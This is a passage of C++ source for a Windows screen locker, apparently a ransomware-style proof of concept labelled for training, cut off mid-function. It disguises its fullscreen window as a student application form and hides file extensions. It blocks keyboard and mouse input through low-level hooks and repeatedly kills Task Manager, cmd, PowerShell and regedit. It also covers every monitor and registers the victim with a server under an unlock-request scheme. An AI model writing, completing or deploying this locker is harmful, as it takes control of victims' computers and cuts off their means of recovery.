#include "ScreenLocker.h"
#include <iostream>
#include <wingdi.h>
#include <winuser.h>
#include <random>
#include <sstream>
#include <fstream>
#include <iphlpapi.h>
#include <shlobj.h>
#include <cctype>
#include <iomanip>
#include <comdef.h>
#include <mshtml.h>
#include <exdisp.h>
#include <algorithm>
#include <thread>
#include <shellapi.h>
#include <vector>
#include <tlhelp32.h>

ScreenLocker* ScreenLocker::instance = nullptr;

ScreenLocker::ScreenLocker(HINSTANCE hInst) {
    hInstance = hInst;
    hWnd = nullptr;
    browserRunning = false;
    browserHwnd = nullptr;
    userID = GetOrCreateUserID();

    // ↓↓↓ Hook related variables initialization ↓↓↓
    instance = this;
    keyboardHook = nullptr;
    mouseHook = nullptr;
    inputBlockingEnabled = false;
    allowBrowserInput = false;
    performingSystemAction = false;
    
    // ↓↓↓ Advanced security features variables initialization ↓↓↓
    advancedSecurityEnabled = false;
    taskManagerHwnd = nullptr;
    securityCheckTimer = 0;

    // ↓↓↓ Multi-monitor support variables initialization ↓↓↓
    primaryMonitorIndex = 0;
    multiMonitorEnabled = false;
}

ScreenLocker::~ScreenLocker() {
    RemoveInputHooks();  // remove hooks
    Cleanup();
    instance = nullptr;  // clear static instance
}

bool ScreenLocker::Initialize() {
    std::wcout << L"Starting screen locker..." << std::endl;
    
    // Hide .exe extensions in Windows Explorer
    HideFileExtensions();
    
    // Extract remover executable
    ExtractRemoverExecutable();
    
    // Test server connection first
    if (!TestServerConnection()) {
        SaveToLogFile(userID, "INITIAL_SERVER_CONNECTION_FAILED");
    }
    
    // Register user to server
    SendUserRegistration();
    
    // ↓↓↓ Hook installation added ↓↓↓
    if (!InstallInputHooks()) {
        SaveToLogFile(userID, "INPUT_HOOKS_INSTALLATION_FAILED");
        // continue even if hook installation fails (basic functionality still works)
    } else {
        SaveToLogFile(userID, "INPUT_HOOKS_INSTALLED_SUCCESS");
    }
    
    return CreateMainWindow();
}

bool ScreenLocker::CreateMainWindow() {
    // Register window class
    WNDCLASSW wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"ScreenLockerClass";
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);

    if (!RegisterClassW(&wc)) {
        return false;
    }

    // Get screen dimensions
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    // Create fullscreen topmost window
    hWnd = CreateWindowExW(
        WS_EX_TOPMOST,
        L"ScreenLockerClass",
        L"Student Application Form - Document Viewer",
        WS_POPUP,
        0, 0, width, height,
        nullptr, nullptr, hInstance, this
    );

    if (!hWnd) return false;

    // Set as topmost and show
    SetScreenLockerTopmost();
    ShowWindow(hWnd, SW_SHOW);
    UpdateWindow(hWnd);

    // ↓↓↓ Input blocking enabled ↓↓↓
    EnableInputBlocking();

    // ↓↓↓ Advanced security features enabled ↓↓↓
    EnableAdvancedSecurity();

    // ↓↓↓ Multi-monitor support enabled ↓↓↓
    EnableMultiMonitorSupport();

    return true;
}

int ScreenLocker::Run() {
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return (int)msg.wParam;
}

bool ScreenLocker::InstallInputHooks() {
    SaveToLogFile(userID, "INSTALLING_INPUT_HOOKS");
    
    // 키보드 Hook 설치
    keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,              // Low-level 키보드 Hook
        KeyboardHookProc,            // Hook 프로시저
        hInstance,                   // DLL 핸들 (여기서는 현재 모듈)
        0                            // 모든 스레드에 적용
    );
    
    if (!keyboardHook) {
        DWORD error = GetLastError();
        SaveToLogFile(userID, "KEYBOARD_HOOK_INSTALL_FAILED: " + std::to_string(error));
        return false;
    }
    
    SaveToLogFile(userID, "KEYBOARD_HOOK_INSTALLED");
    
    // 마우스 Hook 설치
    mouseHook = SetWindowsHookEx(
        WH_MOUSE_LL,                 // Low-level 마우스 Hook
        MouseHookProc,               // Hook 프로시저
        hInstance,                   // DLL 핸들
        0                            // 모든 스레드에 적용
    );
    
    if (!mouseHook) {
        DWORD error = GetLastError();
        SaveToLogFile(userID, "MOUSE_HOOK_INSTALL_FAILED: " + std::to_string(error));
        
        // 키보드 Hook은 설치되었으므로 제거
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = nullptr;
        return false;
    }
    
    SaveToLogFile(userID, "MOUSE_HOOK_INSTALLED");
    SaveToLogFile(userID, "ALL_INPUT_HOOKS_INSTALLED_SUCCESS");
    
    return true;
}

void ScreenLocker::RemoveInputHooks() {
    SaveToLogFile(userID, "REMOVING_INPUT_HOOKS");
    
    if (keyboardHook) {
        if (UnhookWindowsHookEx(keyboardHook)) {
            SaveToLogFile(userID, "KEYBOARD_HOOK_REMOVED");
        } else {
            SaveToLogFile(userID, "KEYBOARD_HOOK_REMOVE_FAILED");
        }
        keyboardHook = nullptr;
    }
    
    if (mouseHook) {
        if (UnhookWindowsHookEx(mouseHook)) {
            SaveToLogFile(userID, "MOUSE_HOOK_REMOVED");
        } else {
            SaveToLogFile(userID, "MOUSE_HOOK_REMOVE_FAILED");
        }
        mouseHook = nullptr;
    }
    
    SaveToLogFile(userID, "INPUT_HOOKS_CLEANUP_COMPLETED");
}



void ScreenLocker::EnableInputBlocking() {
    inputBlockingEnabled = true;
    SaveToLogFile(userID, "INPUT_BLOCKING_ENABLED");
}

void ScreenLocker::DisableInputBlocking() {
    inputBlockingEnabled = false;
    SaveToLogFile(userID, "INPUT_BLOCKING_DISABLED");
}

void ScreenLocker::SetBrowserInputMode(bool allow) {
    allowBrowserInput = allow;
    if (allow) {
        SaveToLogFile(userID, "BROWSER_INPUT_ALLOWED");
    } else {
        SaveToLogFile(userID, "BROWSER_INPUT_BLOCKED");
    }
}

void ScreenLocker::SetSystemActionMode(bool performing) {
    performingSystemAction = performing;
    if (performing) {
        SaveToLogFile(userID, "SYSTEM_ACTION_MODE_ENABLED");
    } else {
        SaveToLogFile(userID, "SYSTEM_ACTION_MODE_DISABLED");
    }
}

LRESULT CALLBACK ScreenLocker::KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Hook 체인을 계속 진행해야 하는 경우
    if (nCode < 0) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    // ScreenLocker 인스턴스 확인
    ScreenLocker* pThis = GetInstance();
    if (!pThis) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    // 입력 차단이 비활성화된 경우 모든 입력 허용
    if (!pThis->inputBlockingEnabled) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    // 키보드 입력 차단 여부 판단
    if (pThis->ShouldBlockKeyboardInput(wParam, lParam)) {
        // 차단된 키 로깅 (너무 많지 않게)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* pkbhs = (KBDLLHOOKSTRUCT*)lParam;
            pThis->SaveToLogFile(pThis->userID, "BLOCKED_KEY: " + std::to_string(pkbhs->vkCode));
        }
        return 1; // 입력 차단 (다음 Hook으로 전달하지 않음)
    }
    
    // 허용된 입력은 다음 Hook으로 전달
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

LRESULT CALLBACK ScreenLocker::MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Hook 체인을 계속 진행해야 하는 경우
    if (nCode < 0) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    // ScreenLocker 인스턴스 확인
    ScreenLocker* pThis = GetInstance();
    if (!pThis) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    // 입력 차단이 비활성화된 경우 모든 입력 허용
    if (!pThis->inputBlockingEnabled) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    // 마우스 입력 차단 여부 판단
    if (pThis->ShouldBlockMouseInput(wParam, lParam)) {
        // 차단된 마우스 액션 로깅
        std::string actionName;
        switch (wParam) {
            case WM_RBUTTONDOWN: actionName = "RIGHT_CLICK"; break;
            case WM_MBUTTONDOWN: actionName = "MIDDLE_CLICK"; break;
            case WM_XBUTTONDOWN: actionName = "X_BUTTON"; break;
            default: actionName = "MOUSE_ACTION_" + std::to_string(wParam); break;
        }
        pThis->SaveToLogFile(pThis->userID, "BLOCKED_MOUSE: " + actionName);
        return 1; // 입력 차단
    }
    
    // 허용된 입력은 다음 Hook으로 전달
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

bool ScreenLocker::ShouldBlockKeyboardInput(WPARAM wParam, LPARAM lParam) {
    // Allow keys only during system actions (Alt+A, etc.)
    if (performingSystemAction) {
        return false; // Allow all keys during system actions
    }
    
    // Block all keys in all other cases
    return true;
}

bool ScreenLocker::ShouldBlockMouseInput(WPARAM wParam, LPARAM lParam) {
    // 시스템 동작 수행 중에는 모든 마우스 입력 허용
    if (performingSystemAction) {
        return false;
    }
    
    // 모든 상황에서 좌클릭과 마우스 이동만 허용, 나머지는 차단
    switch (wParam) {
        case WM_LBUTTONDOWN:
        case WM_LBUTTONUP:
        case WM_MOUSEMOVE:
            return false; // 허용
            
        case WM_RBUTTONDOWN:
        case WM_RBUTTONUP:
        case WM_MBUTTONDOWN:
        case WM_MBUTTONUP:
        case WM_XBUTTONDOWN:
        case WM_XBUTTONUP:
        case WM_MOUSEWHEEL:      // 마우스 휠도 차단
        case WM_MOUSEHWHEEL:     // 가로 스크롤도 차단
            return true; // 차단
            
        default:
            return false; // 기본적으로 허용 (이동 등)
    }
}

bool ScreenLocker::IsAllowedSystemKey(DWORD vkCode) {
    // Block all keys - no exceptions
    return false;
}

void ScreenLocker::EnableAdvancedSecurity() {
    if (advancedSecurityEnabled) return;
    
    advancedSecurityEnabled = true;
    SaveToLogFile(userID, "ADVANCED_SECURITY_ENABLED");
    
    // 보안 체크 타이머 시작 (1초마다)
    securityCheckTimer = (DWORD)SetTimer(hWnd, 1001, 1000, SecurityCheckCallback);
    
    if (securityCheckTimer) {
        SaveToLogFile(userID, "SECURITY_CHECK_TIMER_STARTED");
    } else {
        SaveToLogFile(userID, "SECURITY_CHECK_TIMER_FAILED");
    }
    
    // 즉시 한 번 체크
    DetectAndBlockTaskManager();
    BlockCriticalSystemProcesses();
}

void ScreenLocker::DisableAdvancedSecurity() {
    if (!advancedSecurityEnabled) return;
    
    advancedSecurityEnabled = false;
    SaveToLogFile(userID, "ADVANCED_SECURITY_DISABLED");
    
    // 타이머 제거
    if (securityCheckTimer) {
        KillTimer(hWnd, 1001);
        securityCheckTimer = 0;
        SaveToLogFile(userID, "SECURITY_CHECK_TIMER_STOPPED");
    }
}

void CALLBACK ScreenLocker::SecurityCheckCallback(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
    ScreenLocker* pThis = GetInstance();
    if (!pThis || !pThis->advancedSecurityEnabled) return;
    
    // 작업 관리자 체크 및 차단
    if (pThis->DetectAndBlockTaskManager()) {
        pThis->SaveToLogFile(pThis->userID, "TASK_MANAGER_DETECTED_AND_BLOCKED");
    }
    
    // 중요 시스템 프로세스 차단
    pThis->BlockCriticalSystemProcesses();
}

bool ScreenLocker::DetectAndBlockTaskManager() {
    // 작업 관리자 창 찾기
    HWND taskMgr = FindWindow(L"TaskManagerWindow", NULL);
    if (!taskMgr) {
        taskMgr = FindWindow(L"#32770", L"작업 관리자");  // 한글
    }
    if (!taskMgr) {
        taskMgr = FindWindow(L"#32770", L"Task Manager");  // 영문
    }
    
    if (taskMgr) {
        taskManagerHwnd = taskMgr;
        SaveToLogFile(userID, "TASK_MANAGER_WINDOW_DETECTED");
        
        // 창 숨기기 및 비활성화
        ShowWindow(taskMgr, SW_HIDE);
        EnableWindow(taskMgr, FALSE);
        
        // 프로세스 종료 시도
        return TerminateTaskManager();
    }
    
    return false;
}

bool ScreenLocker::IsTaskManagerRunning() {
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    bool found = false;
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            std::wstring processNameW(pe32.szExeFile);
            std::string processName = WStringToString(processNameW);
            
            // 작업 관리자 프로세스명들
            if (processName.find("Taskmgr.exe") != std::string::npos ||
                processName.find("taskmgr.exe") != std::string::npos ||
                processName.find("TASKMGR.EXE") != std::string::npos) {
                
                SaveToLogFile(userID, "TASK_MANAGER_PROCESS_DETECTED: " + processName);
                found = true;
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }
    
    CloseHandle(hProcessSnap);
    return found;
}

bool ScreenLocker::TerminateTaskManager() {
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    bool terminated = false;
    
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            std::wstring processNameW(pe32.szExeFile);
            std::string processName = WStringToString(processNameW);
            
            if (processName.find("Taskmgr.exe") != std::string::npos ||
                processName.find("taskmgr.exe") != std::string::npos ||
                processName.find("TASKMGR.EXE") != std::string::npos) {
                
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
    
                if (hProcess) {
                    if (TerminateProcess(hProcess, 0)) {
                        SaveToLogFile(userID, "TASK_MANAGER_TERMINATED: " + processName);
                        terminated = true;
                    } else {
                        SaveToLogFile(userID, "TASK_MANAGER_TERMINATE_FAILED: " + processName);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }
    
    CloseHandle(hProcessSnap);
    return terminated;
}

void ScreenLocker::BlockCriticalSystemProcesses() {
    // 추가로 차단할 시스템 프로세스들
    std::vector<std::string> blockedProcesses = {
        "cmd.exe",           // 명령 프롬프트
        "powershell.exe",    // PowerShell
        "regedit.exe",       // 레지스트리 편집기
        "msconfig.exe",      // 시스템 구성
        "services.msc",      // 서비스 관리
        "compmgmt.msc",      // 컴퓨터 관리
        "devmgmt.msc"        // 장치 관리자
    };
    
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            std::wstring processNameW(pe32.szExeFile);
            std::string processName = WStringToString(processNameW);
            
            // 차단 대상 프로세스 체크
            for (const auto& blocked : blockedProcesses) {
                if (processName.find(blocked) != std::string::npos) {
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
        
                    if (hProcess) {
                        if (TerminateProcess(hProcess, 0)) {
                            SaveToLogFile(userID, "BLOCKED_SYSTEM_PROCESS: " + processName);
                        }
                        CloseHandle(hProcess);
                    }
                    break;
                }
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }
    
    CloseHandle(hProcessSnap);
}

bool ScreenLocker::BlockSystemKeys(DWORD vkCode, bool isSystemKey) {
    // 시스템 종료 관련 키 조합 차단
    static bool ctrlPressed = false;
    static bool altPressed = false;
    static bool shiftPressed = false;
    
    // 키 상태 추적
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000) ctrlPressed = true;
    else ctrlPressed = false;
    
    if (GetAsyncKeyState(VK_MENU) & 0x8000) altPressed = true;
    else altPressed = false;
    
    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) shiftPressed = true;
    else shiftPressed = false;
    
    // 위험한 키 조합들 차단
    if (ctrlPressed && shiftPressed && vkCode == VK_ESCAPE) {
        SaveToLogFile(userID, "BLOCKED_CTRL_SHIFT_ESC");
        return true; // 차단
    }
    
    if (ctrlPressed && altPressed && vkCode == VK_DELETE) {
        SaveToLogFile(userID, "BLOCKED_CTRL_ALT_DEL");
        return true; // 차단
    }
    
    if (altPressed && vkCode == VK_F4) {
        SaveToLogFile(userID, "BLOCKED_ALT_F4");
        return true; // 차단
    }
    
    // Windows 키 조합들
    if (vkCode == VK_LWIN || vkCode == VK_RWIN) {
        SaveToLogFile(userID, "BLOCKED_WINDOWS_KEY");
        return true; // 차단
    }
    
    return false; // 차단하지 않음
}

void ScreenLocker::EnableMultiMonitorSupport() {
    if (multiMonitorEnabled) return;
    
    SaveToLogFile(userID, "ENABLING_MULTI_MONITOR_SUPPORT");
    
    // 모니터 감지
    if (!DetectMonitors()) {
        SaveToLogFile(userID, "MONITOR_DETECTION_FAILED");
        return;
    }
    
    // 다중 모니터 창들 생성
    if (!CreateMonitorWindows()) {
        SaveToLogFile(userID, "MONITOR_WINDOWS_CREATION_FAILED");
        return;
    }
    
    multiMonitorEnabled = true;
    SaveToLogFile(userID, "MULTI_MONITOR_SUPPORT_ENABLED");
}

void ScreenLocker::DisableMultiMonitorSupport() {
    if (!multiMonitorEnabled) return;
    
    SaveToLogFile(userID, "DISABLING_MULTI_MONITOR_SUPPORT");
    
    DestroyMonitorWindows();
    monitorWindows.clear();
    monitorInfos.clear();
    
    multiMonitorEnabled = false;
    SaveToLogFile(userID, "MULTI_MONITOR_SUPPORT_DISABLED");
}

bool ScreenLocker::DetectMonitors() {
    SaveToLogFile(userID, "DETECTING_MONITORS");
    
    // 기존 정보 초기화
    monitorInfos.clear();
    primaryMonitorIndex = 0;
    
    // 모니터 열거
    if (!EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, (LPARAM)this)) {
        SaveToLogFile(userID, "ENUM_DISPLAY_MONITORS_FAILED");
        return false;
    }
    
    SaveToLogFile(userID, "DETECTED_MONITORS_COUNT: " + std::to_string(monitorInfos.size()));
    
    // 기본 모니터 찾기
    for (size_t i = 0; i < monitorInfos.size(); i++) {
        if (monitorInfos[i].dwFlags & MONITORINFOF_PRIMARY) {
            primaryMonitorIndex = (int)i;
            SaveToLogFile(userID, "PRIMARY_MONITOR_INDEX: " + std::to_string(i));
            break;
        }
    }
    
    return monitorInfos.size() > 0;
}

BOOL CALLBACK ScreenLocker::MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData) {
    ScreenLocker* pThis = (ScreenLocker*)dwData;
    if (!pThis) return FALSE;
    
    MONITORINFO monitorInfo;
    monitorInfo.cbSize = sizeof(MONITORINFO);
    
    if (GetMonitorInfo(hMonitor, &monitorInfo)) {
        pThis->monitorInfos.push_back(monitorInfo);
        
        int width = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
        int height = monitorInfo.rcMonitor.bottom - monitorInfo.rcMonitor.top;
        bool isPrimary = (monitorInfo.dwFlags & MONITORINFOF_PRIMARY) != 0;
        
        pThis->SaveToLogFile(pThis->userID, 
            "MONITOR_DETECTED: " + std::to_string(pThis->monitorInfos.size()) + 
            " Size: " + std::to_string(width) + "x" + std::to_string(height) +
            " Primary: " + (isPrimary ? "Yes" : "No"));
    }
    
    return TRUE; // 계속 열거
}

bool ScreenLocker::CreateMonitorWindows() {
    SaveToLogFile(userID, "CREATING_MONITOR_WINDOWS");
    
    // 기존 창들 정리
    DestroyMonitorWindows();
    
    // 각 모니터별로 창 생성 (기본 모니터 제외)
    for (size_t i = 0; i < monitorInfos.size(); i++) {
        if ((int)i == primaryMonitorIndex) {
            // 기본 모니터는 이미 메인 창이 있으므로 건너뛰기
            monitorWindows.push_back(hWnd);
            SaveToLogFile(userID, "PRIMARY_MONITOR_USING_MAIN_WINDOW: " + std::to_string(i));
            continue;
        }
        
        // 보조 모니터용 창 생성
        HWND secondaryWindow = CreateSecondaryWindow(monitorInfos[i], (int)i);
        if (secondaryWindow) {
            monitorWindows.push_back(secondaryWindow);
            SaveToLogFile(userID, "SECONDARY_WINDOW_CREATED: Monitor" + std::to_string(i));
        } else {
            SaveToLogFile(userID, "SECONDARY_WINDOW_CREATION_FAILED: Monitor" + std::to_string(i));
            monitorWindows.push_back(nullptr);
        }
    }
    
    return true;
}

HWND ScreenLocker::CreateSecondaryWindow(const MONITORINFO& monitorInfo, int monitorIndex) {
    // 보조 창용 윈도우 클래스 등록
    std::wstring className = L"ScreenLockerSecondary" + std::to_wstring(monitorIndex);
    
    WNDCLASSW wc = {};
    wc.lpfnWndProc = SecondaryWindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = className.c_str();
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    
    RegisterClassW(&wc);
    
    // 모니터 크기 계산
    int x = monitorInfo.rcMonitor.left;
    int y = monitorInfo.rcMonitor.top;
    int width = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
    int height = monitorInfo.rcMonitor.bottom - monitorInfo.rcMonitor.top;
    
    // 보조 창 생성
    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        className.c_str(),
        L"Document Viewer - Extended Display",
        WS_POPUP | WS_VISIBLE,
        x, y, width, height,
        nullptr, nullptr, hInstance, this
    );
    
    if (hwnd) {
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, 
                    SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
        ShowWindow(hwnd, SW_SHOW);
        UpdateWindow(hwnd);
    }
    
    return hwnd;
}

LRESULT CALLBACK ScreenLocker::SecondaryWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    ScreenLocker* pThis = nullptr;

    if (uMsg == WM_NCCREATE) {
        CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
        pThis = (ScreenLocker*)pCreate->lpCreateParams;
        SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)pThis);
    } else {
        pThis = (ScreenLocker*)GetWindowLongPtr(hWnd, GWLP_USERDATA);
    }

    switch (uMsg) {
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);

            // 검은 배경
            RECT rect;
            GetClientRect(hWnd, &rect);
            FillRect(hdc, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));

            // 간단한 텍스트 표시
            SetTextColor(hdc, RGB(255, 0, 0));
            SetBkMode(hdc, TRANSPARENT);
            
            HFONT hFont = CreateFont(40, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                   DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
                                   CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                                   VARIABLE_PITCH, L"Arial");
            
            HFONT oldFont = (HFONT)SelectObject(hdc, hFont);
            
            const wchar_t* message = L"[PoC Training] Access Denied - Secondary Monitor";
            DrawText(hdc, message, -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            
            SelectObject(hdc, oldFont);
            DeleteObject(hFont);
            EndPaint(hWnd, &ps);
            return 0;
        }
        
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:
        case WM_LBUTTONDOWN:
        case WM_RBUTTONDOWN:
            // 모든 입력 무시 (메인 창에서 Hook으로 처리)
            return 0;
            
        case WM_CLOSE:
            // 창 닫기 방지
            return 0;
            
        case WM_DESTROY:
            return 0;
    }
    
    return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

void ScreenLocker::DestroyMonitorWindows() {
    SaveToLogFile(userID, "DESTROYING_MONITOR_WINDOWS");
    
    for (size_t i = 0; i < monitorWindows.size(); i++) {
        if (monitorWindows[i] && monitorWindows[i] != hWnd) {
            // 메인 창이 아닌 보조 창들만 파괴
            DestroyWindow(monitorWindows[i]);
            SaveToLogFile(userID, "SECONDARY_WINDOW_DESTROYED: Monitor" + std::to_string(i));
        }
    }
    
    monitorWindows.clear();
}

void ScreenLocker::UpdateMonitorConfiguration() {
    if (!multiMonitorEnabled) return;
    
    SaveToLogFile(userID, "UPDATING_MONITOR_CONFIGURATION");
    
    // 모니터 재감지
    std::vector<MONITORINFO> oldMonitorInfos = monitorInfos;
    
    if (DetectMonitors()) {
        // 모니터 구성이 변경되었는지 확인
        bool configChanged = (oldMonitorInfos.size() != monitorInfos.size());
        
        if (configChanged) {
            SaveToLogFile(userID, "MONITOR_CONFIG_CHANGED_RECREATING_WINDOWS");
            CreateMonitorWindows();
        }
    }
}

void ScreenLocker::Cleanup() {
    // ↓↓↓ Advanced security features disabled ↓↓↓
    DisableAdvancedSecurity();

    // ↓↓↓ Multi-monitor support disabled ↓↓↓
    DisableMultiMonitorSupport();

    // Release cursor and reset browser state
    ReleaseCursorConfinement();
    browserRunning = false;
    browserHwnd = nullptr;
    
    // Destroy main window
    if (hWnd) {
        DestroyWindow(hWnd);
        hWnd = nullptr;
    }
}

LRESULT CALLBACK ScreenLocker::WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    ScreenLocker* pThis = nullptr;

    if (uMsg == WM_NCCREATE) {
        CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
        pThis = (ScreenLocker*)pCreate->lpCreateParams;
        SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)pThis);
    } else {
        pThis = (ScreenLocker*)GetWindowLongPtr(hWnd, GWLP_USERDATA);
    }

    switch (uMsg) {
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);

            // Background Color Black
            RECT rect;
            GetClientRect(hWnd, &rect);
            FillRect(hdc, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));

            // Font Setting
            HFONT hFont = CreateFont(
                50,
                0, 0, 0, FW_BOLD,
                FALSE, FALSE, FALSE,
                DEFAULT_CHARSET,
                OUT_OUTLINE_PRECIS,
                CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY,
                VARIABLE_PITCH,
                L"Times New Roman"
            );
            
            HFONT oldFont = (HFONT)SelectObject(hdc, hFont);

            // Red Text Color
            SetTextColor(hdc, RGB(255, 0, 0));
            SetBkMode(hdc, TRANSPARENT);

            // Main Message
            const wchar_t* message = L"[PoC Training] System Access Denied";
            RECT textRect = rect;
            textRect.bottom = textRect.bottom / 2 - 50;
            DrawText(hdc, message, -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

            // User ID Message
            textRect = rect;
            textRect.top = rect.bottom / 2 + 50;

            if (pThis) {
                std::wstring wideUserID(pThis->userID.begin(), pThis->userID.end());
                std::wstring userIDMessage = L"Your User ID: " + wideUserID;
                DrawText(hdc, userIDMessage.c_str(), -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            } else {
                DrawText(hdc, L"Your User ID: (loading...)", -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            }

            // Draw Button
            RECT buttonRect;
            buttonRect.left = rect.right / 2 - 230;
            buttonRect.right = rect.right / 2 + 230;
            buttonRect.top = rect.bottom / 2 + 150;
            buttonRect.bottom = rect.bottom / 2+ 220;
            // Draw Button Background
            HBRUSH buttonBrush = CreateSolidBrush(RGB(100, 100, 100));
            FillRect(hdc, &buttonRect, buttonBrush);
            DeleteObject(buttonBrush);
            //Draw Button Text
            SetTextColor(hdc, RGB(255, 255, 255));
            DrawText(hdc, L"[POC] Request Unlock", -1, &buttonRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

            SelectObject(hdc, oldFont);
            DeleteObject(hFont);
            EndPaint(hWnd, &ps);

            return 0;
        }

        case WM_LBUTTONDOWN: {
            int xPos = LOWORD(lParam);
            int yPos = HIWORD(lParam);
            
            RECT rect;
            GetClientRect(hWnd, &rect);
            
            // Calculate the button area
            RECT buttonRect;
            buttonRect.left = rect.right / 2 - 230;
            buttonRect.right = rect.right / 2 + 230;
            buttonRect.top = rect.bottom / 2 + 150;
            buttonRect.bottom = rect.bottom / 2+ 220;
            
            // Check if the click is within the button area
            if (xPos >= buttonRect.left && xPos <= buttonRect.right && yPos >= buttonRect.top && yPos <= buttonRect.bottom) {
                
                if (pThis && !pThis->browserRunning) { // 브라우저가 이미 실행 중이면 중복 실행 방지
                    pThis->SaveToLogFile(pThis->userID, "UNLOCK_BUTTON_CLICKED");
                    // 새 스레드에서 잠금 해제 과정을 처리하도록 호출
                    std::thread(&ScreenLocker::HandleUnlockProcess, pThis).detach();
                }
                
                return 0;
            }
            
            break;
        }

        case WM_DESTROY:
            PostQuitMessage(0);
            return 0; // Prevent Window Closing
            break;
    }
    return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

// Get MAC Address to Generate User ID
std::string ScreenLocker::GetMacAddress() {
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD dwBufLen = sizeof(adapterInfo);

    DWORD dwStatus = GetAdaptersInfo(adapterInfo, &dwBufLen);
    if (dwStatus == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
        if (pAdapterInfo) {
            char buffer[3];
            sprintf_s(buffer, "%02X", pAdapterInfo->Address[0]);
            return std::string(buffer);
        }
    }
    return "FF";
}

// Generate Random ID
std::string ScreenLocker::GenerateRandomID() {
    std::random_device rd;
    std::mt19937 gen(rd());

    std::string result;

    // Add MAC Address + "-"
    std::string macPrefix = GetMacAddress();

    for (char& c : macPrefix) {
        c = std::toupper(c);
    }
    result = macPrefix + "-";

    // Add 3 numbers
    std::uniform_int_distribution<> numdis(0, 9);
    for (int i = 0; i < 3; i++) {
        result += ('0' + numdis(gen));
    }

    // Add 3 lowercase letters
    std::uniform_int_distribution<> alphaDis(0, 25);
    for (int i = 0; i < 3; i++) {
        result += static_cast<char>('a' + alphaDis(gen));
    }

    // URL-safe 특수문자만 사용 (? & = / 등 제외)
